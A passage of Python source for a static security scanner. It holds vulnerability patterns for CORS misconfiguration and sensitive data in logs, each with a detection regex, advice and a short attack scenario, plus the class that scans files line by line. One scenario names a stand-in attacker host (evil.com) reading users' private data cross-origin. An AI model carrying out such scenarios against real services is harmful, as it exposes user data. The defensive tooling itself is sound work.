            "- Never combine Allow-Origin: * with Allow-Credentials: true\n"
            "- Validate Origin header against a dynamic allowlist"
        ),
        attack=(
            "Attacker hosts https://evil.com, makes AJAX requests to your API\n"
            "Effect: Reads private user data if user is authenticated (CSRF-like cross-origin data theft)"
        ),
    ),

    VulnPattern(
        id="sensitive_logging",
        title="Sensitive Data Logged",
        patterns=_r(
            r"""(?:log(?:ger)?\.(?:debug|info|warn|error|critical)|print|console\.(?:log|warn|error))\s*\([^)]*(?:password|passwd|token|secret|api.?key|credit.?card|ssn|cvv|pin)""",
        ),
        suppress=_r(r"""log.*mask|log.*redact|log.*censor|log.*\*\*"""),
        extensions={".py", ".js", ".ts", ".java", ".rb", ".go", ".php"},
        severity=Severity.MEDIUM,
        category=Category.LOGGING,
        cwe="CWE-532",
        description="Sensitive data (passwords, tokens, keys) is written to log files. Logs often have weaker access controls than databases.",
        recommendation=(
            "- Never log sensitive fields\n"
            "- Use structured logging with field masking: log.info('auth', user=user_id)  # not password\n"
            "- Implement a log scrubbing middleware"
        ),
        attack="Attacker gains read access to log files (S3 bucket misconfiguration, exposed log endpoint) and extracts credentials.",
    ),
]


# ── Scanner Class ──────────────────────────────────────────────────────────

class StaticAnalyzer(BaseScanner):
    name = "Static Code Analyzer"

    def scan(self) -> ScanResult:
        start = time.time()
        result = ScanResult(scanner_name=self.name)

        # Build reverse index: extension → list of applicable patterns
        ext_index: dict[str, list[VulnPattern]] = {}
        for vp in VULNERABILITY_PATTERNS:
            for ext in vp.extensions:
                ext_index.setdefault(ext, []).append(vp)

        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]

            for fname in files:
                fpath = os.path.join(root, fname)
                ext = os.path.splitext(fname)[1].lower()

                # Skip binary / minified files
                if ext in BINARY_EXTENSIONS or fname.endswith(".min.js"):
                    continue
                if ext not in ext_index:
                    continue

                try:
                    if os.path.getsize(fpath) > MAX_FILE_SIZE:
                        continue
                except OSError:
                    continue

                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                except (OSError, PermissionError):
                    continue

                is_test = bool(TEST_FILE_PATTERNS.search(fpath))
                rel_path = os.path.relpath(fpath, self.target_path)
                findings = self._scan_file(lines, rel_path, ext, ext_index, is_test)
                result.findings.extend(findings)
                result.files_scanned += 1

        result.scan_time_seconds = time.time() - start
        return result

    def _scan_file(
        self,
        lines: list[str],
        rel_path: str,
        ext: str,
        ext_index: dict,
        is_test: bool,
    ) -> list[Finding]:
        findings: list[Finding] = []
        full_text = "".join(lines)

        applicable = ext_index.get(ext, [])

        # Track reported (vuln_id, line) to avoid duplicates
        reported: set[tuple[str, int]] = set()

        for i, line in enumerate(lines, 1):
            stripped = line.strip()

            # Skip blank lines and pure comments
            if not stripped:
                continue
            if stripped.startswith(("#", "//", "/*", "*", "<!--", "--")):
                continue

            for vp in applicable:
                if (vp.id, i) in reported:
                    continue

                # Check if any pattern matches the line
                matched = False
                for pat in vp.patterns:
                    if pat.search(line):
                        matched = True
                        break
                if not matched:
                    continue

                # Check suppress patterns — skip if any suppressor matches
                suppressed = False
                if vp.suppress:
                    for sup in vp.suppress:
                        # Check current line and nearby context
                        context_start = max(0, i - 3)
                        context_end = min(len(lines), i + 2)
                        context = "".join(lines[context_start:context_end])
                        if sup.search(context):
                            suppressed = True
                            break
                if suppressed:
                    continue

                # In test files, skip LOW/MEDIUM findings to reduce noise
                if is_test and vp.severity in (Severity.LOW, Severity.MEDIUM, Severity.INFO):
                    continue

                reported.add((vp.id, i))
                snippet = stripped[:200]

                findings.append(Finding(
                    title=vp.title,
                    severity=vp.severity,
                    category=vp.category,
                    file_path=rel_path,
                    line_number=i,
                    code_snippet=snippet,
                    description=vp.description,
                    recommendation=vp.recommendation,
                    cwe_id=vp.cwe,
                    attack_simulation=vp.attack,
                ))

        return findings
